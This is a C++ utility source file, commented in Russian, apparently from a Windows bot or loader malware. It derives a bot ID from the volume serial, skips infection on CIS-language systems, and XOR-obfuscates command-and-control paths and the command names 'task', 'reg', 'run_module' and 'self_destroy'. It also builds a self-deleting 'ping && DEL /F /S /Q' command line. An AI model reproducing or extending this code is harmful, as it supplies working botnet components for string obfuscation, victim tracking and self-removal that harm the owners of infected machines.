#include "Utils.h"
#include "../Config.h"
#include "../Utils/XorStr.h"
#include "../String/StringHelpers.h"

/*
	Возвращает хэндл кучи процесса
*/
HANDLE GetHeap()
{
	__asm
	{
		mov eax, fs: [0x30]
		mov eax, [eax + 0x18]
	}
}

/*
	Возвращает адрес выделенной памяти в куче
	Параметры:
	- size - размер требуемой памяти
*/

void* hAlloc(size_t size)
{
	return API(KERNEL32, HeapAlloc)(GetHeap(), 0, size);
}


/*
	Освобождает выделенную память
*/

void hFree(void* mem)
{
	if (mem) API(KERNEL32, HeapFree)(GetHeap(), 0, mem);
}

/*
	Возвращает true, если файл существует
	Параметры:
	- path - путь до файла/папки
*/
bool IsFileExist(wchar_t* path)
{
    return API(KERNEL32, GetFileAttributesW)(path) != 0xFFFFFFFF;
}

/*
	Генератор псевдо-случайных чисел
*/
static ULONG PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

/*
	Возвращает уникальный идентификатор бота
*/
wchar_t* GetBotUid()
{
	wchar_t winDir[MAX_PATH];
	if (!API(KERNEL32, GetWindowsDirectoryW)(winDir, MAX_PATH)) winDir[0] = 'C';

	wchar_t volumeName[4];
	volumeName[0] = winDir[0];
	volumeName[1] = ':';
	volumeName[2] = '\\';
	volumeName[3] = '\0';

	DWORD seed = 0;
	API(KERNEL32, GetVolumeInformationW)(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);
	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++) guid.Data4[i] = (UCHAR)PseudoRand(&seed);

	wchar_t* botUid = (wchar_t*)hAlloc(MAX_PATH);
	if (!botUid) return nullptr;

	API(USER32, wsprintfW)(botUid, StaticData::botidFmt, guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
	return botUid;
}

/*
	Возвращает текущий путь
*/
wchar_t* GetCurrentPath()
{
	wchar_t* currentPath = (wchar_t*)hAlloc(MAX_PATH * sizeof(wchar_t));
	if (!currentPath) return nullptr;

	API(KERNEL32, GetModuleFileNameW)(NULL, currentPath, MAX_PATH * sizeof(wchar_t));

	return currentPath;
}

/*
	Возвращает true, системный язык СНГ
	Если вырежете - бутылка мгновенно прямо в стуле, на котром вы сейчас сидите вылезет
*/
bool IsCIS()
{
	LANGID result = API(KERNEL32, GetUserDefaultLangID)();
	if ((result == 1049) || // рф
		(result == 106) ||  // армения
		(result == 1059) || // беларусь
		(result == 1079) || // грузия
		(result == 1087) || // казахстан
		(result == 1064) || // таджикистан
		(result == 2115) || // узбекистан
		(result == 1058))   // украина
	{
		return true; //TODO Включить в релизе
	}

	return false;
}

/*
	Конвертация из ASCII в юникод
*/
size_t ASCIIToUnicode(char* ascii, wchar_t* unicode)
{
	if (!ascii) return 0;
	return API(KERNEL32, MultiByteToWideChar)(CP_UTF8, 0, ascii, -1, unicode, API(KERNEL32, lstrlenA)(ascii) + sizeof(wchar_t));;
}

/*
	Конвертация из юникода в ASCII
*/
size_t UnicodeToASCII(wchar_t* unicode, char* ascii)
{
	if (!unicode) return 0;
	return API(KERNEL32, WideCharToMultiByte)(CP_UTF8, 0, unicode, -1, ascii, API(KERNEL32, lstrlenW)(unicode) + sizeof(char), NULL, NULL);
}

/*
	Аналог memcpy
*/
void* memCpy(void* dest, const void* src, size_t bytes)
{
	byte* cdest = (byte*)dest;
	const byte* csrc = (byte*)src;
	for (size_t i = 0; i < bytes; ++i) *cdest++ = *csrc++;
	return dest;
}

wchar_t* hide_admin_path() {

	static wchar_t str_unicode_admin[1024];
	static char str_askii_admin[1024 * sizeof(wchar_t)];

	strCpyA(str_askii_admin, XorStr(ADMIN_PATH));
	ASCIIToUnicode((char*)str_askii_admin, str_unicode_admin);
	return str_unicode_admin;

	return str_unicode_admin;
}

wchar_t* hide_ping_path() {

	static wchar_t str_unicode_ping[1024];
	static char str_askii_ping[1024 * sizeof(wchar_t)];

	strCpyA(str_askii_ping, XorStr(PING));
	ASCIIToUnicode((char*)str_askii_ping, str_unicode_ping);
	return str_unicode_ping;
}

wchar_t* hide_reg_path() {

	static wchar_t str_unicode_reg[1024];
	static char str_askii_reg[1024 * sizeof(wchar_t)];

	strCpyA(str_askii_reg, XorStr(REG));
	ASCIIToUnicode((char*)str_askii_reg, str_unicode_reg);
	return str_unicode_reg;
}

wchar_t* hide_download_module_path() {

	static wchar_t str_unicode_download[1024];
	static char str_askii_download[1024 * sizeof(wchar_t)];

	strCpyA(str_askii_download, XorStr(DOWNLOAD_MODULE));
	ASCIIToUnicode((char*)str_askii_download, str_unicode_download);
	return str_unicode_download;
}

wchar_t* hide_install_path() {

	static wchar_t str_unicode_install_path[1024];
	static char str_askii_install_path[1024 * sizeof(wchar_t)];

	strCpyA(str_askii_install_path, XorStr(BOT_NAME_INSTALL));
	ASCIIToUnicode((char*)str_askii_install_path, str_unicode_install_path);
	return str_unicode_install_path;
}

wchar_t* hide_error_path() {

	static wchar_t str_unicode_error[1024];
	static char str_askii_error[1024 * sizeof(wchar_t)];

	strCpyA(str_askii_error, XorStr(ERROR_PATH));
	ASCIIToUnicode((char*)str_askii_error, str_unicode_error);
	return str_unicode_error;
}

char* hide_str_task() {

	static char str_askii_str_task[1024 * sizeof(wchar_t)];
	strCpyA(str_askii_str_task, XorStr("task"));

	return str_askii_str_task;
}

char* hide_str_reg() {

	static char str_askii_str_reg[1024 * sizeof(wchar_t)];
	strCpyA(str_askii_str_reg, XorStr("reg"));

	return str_askii_str_reg;
}

char* hide_str_self_destroy() {

	static char str_askii_str_self_destroy[1024 * sizeof(wchar_t)];
	strCpyA(str_askii_str_self_destroy, XorStr("self_destroy"));

	return str_askii_str_self_destroy;
}

char* hide_str_run_module() {

	static char str_askii_str_run_module[1024 * sizeof(wchar_t)];
	strCpyA(str_askii_str_run_module, XorStr("run_module"));

	return str_askii_str_run_module;
}

char* hide_str_ping() {

	static char str_askii_str_ping[1024 * sizeof(wchar_t)];
	strCpyA(str_askii_str_ping, XorStr("ping"));

	return str_askii_str_ping;
}

char* hide_str_exe() {

	static char str_askii_str_ping[1024 * sizeof(wchar_t)];
	strCpyA(str_askii_str_ping, XorStr("exe"));

	return str_askii_str_ping;
}

wchar_t* hide_str_to_destroy() {

	static wchar_t str_unicode_to_destroy[1024];
	static char str_askii_to_destroy[1024 * sizeof(wchar_t)];

	strCpyA(str_askii_to_destroy, XorStr("/c ping 127.0.0.1 && DEL /F /S /Q /A "));
	ASCIIToUnicode((char*)str_askii_to_destroy, str_unicode_to_destroy);
	return str_unicode_to_destroy;

}

